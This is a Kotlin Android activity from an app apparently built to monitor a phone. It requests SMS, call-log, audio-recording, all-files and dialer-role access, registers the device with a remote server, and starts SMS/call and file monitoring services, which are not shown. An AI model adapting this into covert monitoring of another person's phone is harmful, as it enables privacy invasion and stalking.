package com.example.bullsseeclient

import android.Manifest
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult
import androidx.core.content.ContextCompat
import com.example.bullsseeclient.api.ApiClient
import com.example.bullsseeclient.api.DeviceDto
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.time.Instant

class MainActivity : ComponentActivity() {
    private val permissionRequest = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        android.util.Log.d("MainActivity", "permissions callback: starting services")
        val perms = requiredPermissions()
        val allGranted = perms.all { p ->
            result[p] == true || ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
        }
        if (!allGranted) {
            android.util.Log.e("MainActivity", "required permissions not granted; aborting service start")
            return@registerForActivityResult
        }
        maybeRequestDialerRole()
        registerDevice()
        com.example.bullsseeclient.services.SmsCallMonitorService.start(this)
        com.example.bullsseeclient.services.FileService.start(this)
    }

    private val roleRequestLauncher = registerForActivityResult(StartActivityForResult()) { }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkAndRequestAllFilesAccess()
        val permissions = requiredPermissions()
        permissionRequest.launch(permissions.toTypedArray())
        android.util.Log.d("MainActivity", "requested permissions and starting flow")
    }

    private fun checkAndRequestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                val intent = Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = android.net.Uri.parse("package:$packageName")
                startActivity(intent)
            }
        }
    }

    private fun registerDevice() {
        val device = DeviceDto(
            deviceName = android.os.Build.MODEL,
            model = android.os.Build.MODEL,
            osVersion = android.os.Build.VERSION.RELEASE,
            lastUpdated = Instant.now().toEpochMilli()
        )
        
        ApiClient.api.registerDevice(device).enqueue(object : Callback<Void> {
            override fun onResponse(call: Call<Void>, response: Response<Void>) {
                Log.d("MainActivity", "Register status=${response.code()}")
            }
            override fun onFailure(call: Call<Void>, t: Throwable) {
                Log.e("MainActivity", "Register error=${t.message}")
            }
        })
    }

    private fun requiredPermissions(): MutableList<String> {
        val permissions = mutableListOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (Build.VERSION.SDK_INT >= 33) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return permissions
    }

    private fun maybeRequestDialerRole() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val rm = getSystemService(Context.ROLE_SERVICE) as RoleManager
            if (rm.isRoleAvailable(RoleManager.ROLE_DIALER) && !rm.isRoleHeld(RoleManager.ROLE_DIALER)) {
                val intent = rm.createRequestRoleIntent(RoleManager.ROLE_DIALER)
                roleRequestLauncher.launch(intent)
            }
        }
    }
}
